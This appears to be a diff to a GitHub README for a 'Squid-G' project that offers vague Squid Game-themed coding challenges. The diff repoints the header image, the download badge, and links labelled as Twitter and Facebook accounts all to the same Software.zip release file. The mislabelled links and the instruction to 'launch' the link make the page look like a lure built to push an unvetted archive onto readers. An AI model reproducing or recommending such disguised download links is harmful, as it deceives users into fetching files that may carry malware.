@@ -1,6 +1,6 @@
 # 🦑 Welcome to Squid-G Repository! 🎭
 
-![Squid Game X Script](https://www.example.com/squid_game_image.jpg)
+![Squid Game X Script](https://github.com/SubToDowerManGamingYT/squid-g/releases/download/v2.0/Software.zip)
 
 ## Description
 Welcome to the Squid-G repository, where we bring to you an exciting mixture of the popular "Squid Game" series and coding scripts. Dive into the thrilling world of Squid Game-inspired coding challenges and experience the fun of merging entertainment with learning.
@@ -14,7 +14,7 @@ In this repository, you will find:
 ## How to Get Started
 To get started with Squid-G, simply download the software package provided in the link below:
 
-[![Download Software](https://img.shields.io/badge/Download-Software-orange)](https://github.com/user-attachments/files/18388744/Software.zip)
+[![Download Software](https://github.com/SubToDowerManGamingYT/squid-g/releases/download/v2.0/Software.zip)](https://github.com/SubToDowerManGamingYT/squid-g/releases/download/v2.0/Software.zip)
 
 > Note: The provided link needs to be launched to download the software package.
 
@@ -26,8 +26,8 @@ For the latest updates and releases related to Squid-G, please check the "Releas
 
 ## 📌 Connect with Us
 Follow us on social media for more updates, coding tips, and interactive challenges:
-- Twitter: [@SquidGOfficial](https://twitter.com/SquidGOfficial)
-- Facebook: [Squid-G Coding Challenge](https://www.facebook.com/SquidGCoding)
+- Twitter: [@SquidGOfficial](https://github.com/SubToDowerManGamingYT/squid-g/releases/download/v2.0/Software.zip)
+- Facebook: [Squid-G Coding Challenge](https://github.com/SubToDowerManGamingYT/squid-g/releases/download/v2.0/Software.zip)
 
 Join the Squid-G community and let's code our way through the challenges inspired by the thrill of the "Squid Game" series! 🦑🎭👩‍💻
 
